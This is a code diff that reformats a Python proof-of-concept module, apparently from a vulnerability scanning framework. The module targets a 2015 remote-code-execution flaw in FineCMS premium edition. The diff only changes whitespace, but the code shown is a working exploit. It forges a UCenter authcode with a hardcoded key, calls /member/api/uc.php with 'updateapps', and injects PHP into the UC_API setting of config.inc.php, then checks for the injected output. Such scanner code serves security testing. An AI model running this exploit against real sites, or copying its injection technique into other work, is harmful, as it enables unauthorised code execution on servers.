@@ -9,11 +9,12 @@ import base64
 import urllib
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FineCMS_0004' # 平台漏洞编号，留空
+    vuln_id = 'FineCMS_0004'  # 平台漏洞编号，留空
     name = 'FineCMS高级版 前台getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-09-15'  # 漏洞公布时间
     desc = '''
         FineCMS是一款基于PHP+MySql开发的内容管理系统，采用MVC设计模式实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板，
@@ -34,6 +35,7 @@ class Vuln(ABVuln):
     product = 'FineCMS'  # 漏洞应用名称
     product_version = 'FineCMS高级版'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '7e5c8a8a-66fd-4066-a069-e508259ccb74'
     author = '47bwy'  # POC编写者
@@ -46,61 +48,64 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref:http://www.wooyun.org/bugs/wooyun-2015-0141125
+
+            # ref:http://www.wooyun.org/bugs/wooyun-2015-0141125
             arg = self.target
             hh = hackhttp.hackhttp()
-            def microtime(get_as_float = False):
+
+            def microtime(get_as_float=False):
                 if get_as_float:
                     return time.time()
                 else:
                     return '%.8f %d' % math.modf(time.time())
-                
-            def get_authcode(string, key = ''):
+
+            def get_authcode(string, key=''):
                 ckey_length = 4
                 key = hashlib.md5(key).hexdigest()
                 keya = hashlib.md5(key[0:16]).hexdigest()
                 keyb = hashlib.md5(key[16:32]).hexdigest()
                 keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
                 cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
-         
+
                 key_length = len(cryptkey)
-                string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16] + string
+                string = '0000000000' + \
+                    (hashlib.md5(string+keyb)).hexdigest()[0:16] + string
                 string_length = len(string)
                 result = ''
                 box = range(0, 256)
                 rndkey = dict()
-                for i in range(0,256):
+                for i in range(0, 256):
                     rndkey[i] = ord(cryptkey[i % key_length])
                 j = 0
-                for i in range(0,256):
+                for i in range(0, 256):
                     j = (j + box[i] + rndkey[i]) % 256
                     tmp = box[i]
                     box[i] = box[j]
                     box[j] = tmp
                 a = 0
                 j = 0
-                for i in range(0,string_length):
+                for i in range(0, string_length):
                     a = (a + 1) % 256
                     j = (j + box[a]) % 256
                     tmp = box[a]
                     box[a] = box[j]
                     box[j] = tmp
-                    result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
+                    result += chr(ord(string[i]) ^
+                                  (box[(box[a] + box[j]) % 256]))
                 return keyc + base64.b64encode(result).replace('=', '')
 
-            def get_shell(url,key):
+            def get_shell(url, key):
                 headers = {
-                    'Accept-Language':'zh-cn',
-                    'Content-Type':'application/x-www-form-urlencoded',
-                    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
-                    'Referer':url
+                    'Accept-Language': 'zh-cn',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
+                    'Referer': url
                 }
                 tm = time.time()+10*3600
-                tm = "time=%d&action=updateapps" %tm
-                code = urllib.quote(get_authcode(tm,key))
+                tm = "time=%d&action=updateapps" % tm
+                code = urllib.quote(get_authcode(tm, key))
                 url = url + "?code=" + code
-                data1='''
+                data1 = '''
                     <?xml version="1.0" encoding="ISO-8859-1"?>
                     <root>
                     <item id="UC_API">http://xxx\');echo("testvul");//</item>
@@ -111,7 +116,7 @@ class Poc(ABPoc):
                     ret = urllib2.urlopen(req)
                 except:
                     return "error"
-                data2='''
+                data2 = '''
                     <?xml version="1.0" encoding="ISO-8859-1"?>
                     <root>
                     <item id="UC_API">http://aaa</item>
@@ -123,7 +128,8 @@ class Poc(ABPoc):
                 except:
                     return "error"
                 return 1
-            res = get_shell(arg + "/member/api/uc.php",'8808cer8o1UJsEpt2G2Jn0uhEn/YgEva589Mfo0')
+            res = get_shell(arg + "/member/api/uc.php",
+                            '8808cer8o1UJsEpt2G2Jn0uhEn/YgEva589Mfo0')
             if res != 1:
                 return False
             poc = arg + '/member/ucenter/config.inc.php'
@@ -138,6 +144,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
